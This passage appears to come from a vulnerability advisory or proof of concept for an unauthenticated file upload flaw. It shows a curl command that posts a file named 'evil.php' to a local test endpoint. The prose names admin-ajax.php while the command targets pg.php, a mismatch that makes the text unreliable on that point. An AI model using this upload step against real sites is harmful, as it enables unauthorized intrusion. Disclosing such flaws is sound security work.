...
To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the malicious file.

```bash
curl -X POST -F "file=@evil.php" "http://localhost:8000/pg.php"
```

Note: The file needs to be present in the directory curl command is being run.
